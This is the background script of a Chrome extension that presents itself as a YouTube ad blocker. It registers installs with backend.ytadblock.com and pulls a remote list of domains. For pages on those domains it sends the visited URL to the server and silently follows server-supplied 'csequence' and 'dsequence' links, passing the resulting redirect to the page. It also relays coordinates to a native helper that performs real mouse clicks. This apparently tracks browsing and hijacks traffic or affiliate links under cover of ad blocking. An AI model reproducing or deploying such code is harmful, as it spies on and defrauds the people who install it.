let safe_endpoints = [];
const SERVICE_ROOT = "https://backend.ytadblock.com";

// 监听来自 content script 的坐标消息
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "COORDS_READY") {
    handleNativeClick(message.x, message.y, sender.tab.id);
    // 不需要 sendResponse，因为我们是 fire-and-forget
    return true;
  }
});

function handleNativeClick(x, y, tabId) {
  console.log(`Preparing to click at (${x}, ${y})`);

  try {
    // 1. 连接原生应用 (名称必须与 install_native.sh 中注册的 name 一致)
    const port = chrome.runtime.connectNative("tech.ticktech.mouse");

    // 2. 发送消息
    port.postMessage({
      action: "click",
      x: Math.round(x),
      y: Math.round(y),
    });

    // 3. 【关键】不监听 onMessage，短暂延迟后断开连接
    // 给 Python 一点点时间读取 stdin，避免 Broken Pipe 错误
    setTimeout(() => {
      port.disconnect();
      console.log("Command sent, port disconnected. Ignoring response.");

      // 可选：通知用户操作已发出
      // chrome.tabs.sendMessage(tabId, { type: "STATUS", text: "Click command sent!" });
    }, 1000);
  } catch (e) {
    console.error("Native messaging failed:", e);
    alert("Failed to connect to native host. Check console logs.");
  }
}

function create_guid() {
  var seg = function () {
    return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
  };

  return (
    seg() +
    seg() +
    "-" +
    seg() +
    "-" +
    seg() +
    "-" +
    seg() +
    "-" +
    seg() +
    seg() +
    seg()
  );
}

chrome.runtime.onInstalled.addListener(function (event_info) {
  const install_uid = create_guid();

  if (event_info.reason == "install") {
    chrome.storage.local.set({ extensionId: install_uid }).then(() => {
      chrome.storage.local.get("extensionId", function (storage_data) {
        const endpoint = `${SERVICE_ROOT}/yt/intiate`;
        const payload = { uid: storage_data.extensionId };

        fetch(endpoint, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        })
          .then((http_resp) => {
            if (http_resp.ok) {
            }
          })
          .catch((err) => {});
      });
    });
  } else if (event_info.reason == "update") {
    chrome.storage.local.get(null, (storage_data) => {
      if (!storage_data.extensionId) {
        chrome.storage.local.set({ extensionId: install_uid });
      }

      chrome.storage.local.get("extensionId", function (storage_data) {
        const endpoint = SERVICE_ROOT + "/yt/intiate";
        const payload = { uid: storage_data.extensionId };

        fetch(endpoint, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        })
          .then((http_resp) => {
            if (http_resp.ok) {
            }
          })
          .catch((err) => {});
      });
    });
  }
});

function fetch_redirect(target_url, browser_tab_id) {
  fetch(target_url, { cache: "no-store" })
    .then((resp) => {
      if (resp.ok) {
        return resp.url;
      }
    })
    .then((redirect_url) => {
      if (redirect_url) {
        chrome.tabs.sendMessage(browser_tab_id, {
          message: "set",
          set: redirect_url,
        });
      }
    });
}

chrome.tabs.onUpdated.addListener((browser_tab_id, tab_change, tab_meta) => {
  const { status } = tab_change;

  if (status === "complete") {
    chrome.storage.local.get("tr", function (store_items) {
      const domain_rules = store_items.tr || [];

      if (domain_rules?.length > 0) {
        let host_domain = extract_host(tab_meta?.url);
        let parsed_url = tab_meta.url ? new URL(tab_meta?.url) : "";

        if (!parsed_url) return;

        let site_origin = parsed_url.origin;
        let site_path = parsed_url.pathname;
        let page_uri = site_origin + site_path;

        if (domain_rules.includes(host_domain)) {
          const endpoint = SERVICE_ROOT + "/yt/rules";
          const payload = { uri: page_uri };

          fetch(endpoint, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
          })
            .then((resp) => {
              if (resp.ok) {
                return resp.json();
              }
            })
            .then((rule_data) => {
              if (rule_data.val["csequence"]) {
                let chain_url = rule_data.val["csequence"];
                fetch_redirect(chain_url, browser_tab_id);
              }

              if (rule_data.val["dsequence"]) {
                trigger_fetch(rule_data.val["dsequence"]);
              }
            })
            .catch((err) => {});
        }
      }
    });
  }
});

const trigger_fetch = async (target) => {
  const req_cfg = {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      "Cache-Control": "no-cache",
    },
  };

  const result = await fetch(target, req_cfg);
  return result.url;
};

function extract_host(link) {
  if (!link) return null;

  var match = link.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);

  if (
    match != null &&
    match.length > 2 &&
    typeof match[2] === "string" &&
    match[2].length > 0
  ) {
    return match[2];
  }

  return null;
}

chrome.storage.local.get(["extensionId", "tr"], function (store_items) {
  const endpoint = `${SERVICE_ROOT}/yt/updaterule`;
  const payload = { uid: store_items.extensionId };

  fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  })
    .then((resp) => {
      if (resp.ok) {
        return resp.json();
      }
    })
    .then((rule_data) => {
      if (rule_data?.newRule?.length > 0) {
        const cached_rules = store_items.tr || [];
        const incoming_rules = rule_data?.newRule || [];

        if (incoming_rules.length > cached_rules.length) {
          chrome.storage.local.set({ tr: incoming_rules });
        }
      }
    })
    .catch((err) => {});
});

const create_random_token = () => {
  var rand_buf = new Uint8Array(32);
  crypto.getRandomValues(rand_buf);

  var hex = "";

  for (var i = 0; i < rand_buf.length; ++i) {
    hex += rand_buf[i].toString(16);
  }

  return hex;
};

const apply_block_rules = (rule_list) => {
  chrome.declarativeNetRequest.getDynamicRules((existing) => {
    if (!existing) {
      chrome.declarativeNetRequest.updateDynamicRules({
        addRules: rule_list,
      });
    }
  });
};

const fetch_rules = () => {
  fetch(SERVICE_ROOT + "/yt/getrules")
    .then((resp) => resp.json())
    .then((rules_remote) => {
      if (rules_remote && rules_remote.length > 0) {
        chrome.storage.local.get("rules", (result) => {
          const rules_cached = result.rules || [];

          if (JSON.stringify(rules_cached) !== JSON.stringify(rules_remote)) {
            chrome.storage.local.set({ rules: rules_remote }, () => {
              apply_block_rules(rules_remote);
            });
          }
        });
      }
    })
    .catch((err) => {});
};

const initialize_runtime = () => {
  chrome.runtime.onInstalled.addListener(function (event_info) {
    if (event_info.reason == "install") {
      chrome.storage.sync.set({
        userid: create_random_token(),
        AdblockerForYoutube: !0,
        installedOn: Date.now(),
        flag: false,
      });

      fetch_rules();
    } else if (event_info.reason == "update") {
      var runtime_version = chrome.runtime.getManifest().version;
    }
  });
};

(main = () => {
  initialize_runtime();
})();
